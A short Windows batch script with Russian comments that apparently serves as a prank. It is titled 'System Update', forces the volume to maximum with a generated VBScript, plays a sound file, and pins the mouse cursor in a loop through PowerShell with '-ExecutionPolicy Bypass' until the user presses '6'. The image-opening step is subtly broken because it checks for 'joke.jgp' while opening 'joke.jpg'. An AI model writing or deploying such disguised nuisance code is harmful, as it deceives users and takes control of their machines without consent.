@echo off
title System Update
chcp 1251 >nul

:: 1. Громкость на 100%
echo set oShell = CreateObject("WScript.Shell") > vol.vbs
echo for i = 1 to 50 >> vol.vbs
echo oShell.SendKeys chr(175) >> vol.vbs
echo next >> vol.vbs
cscript //nologo vol.vbs
del vol.vbs

:: 2. Запуск музыки
if exist "C:\joke\menu\mnuroblox\track.ogg" start "" "C:\joke\menu\mnuroblox\track.ogg"

:: 3. Цикл спама и блокировки мыши
:loop
:: Открываем картинку
if exist "C:\joke\menu\mnuroblox\joke.jgp" start "" "C:\joke\menu\mnuroblox\joke.jpg"

:: Команда PowerShell: Переместить курсор в верхний левый угол (0,0)
powershell -ExecutionPolicy Bypass -Command "[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)" >nul 2>&1

:: Проверка кнопки "6" (ждем 1 секунду)
choice /C 60 /T 1 /D 0 /N >nul
if errorlevel 2 goto loop
if errorlevel 1 goto stop

:stop
echo Выключение...
:: Закрываем просмотрщик картинок
taskkill /f /im Microsoft.Photos.exe >nul 2>&1
exit
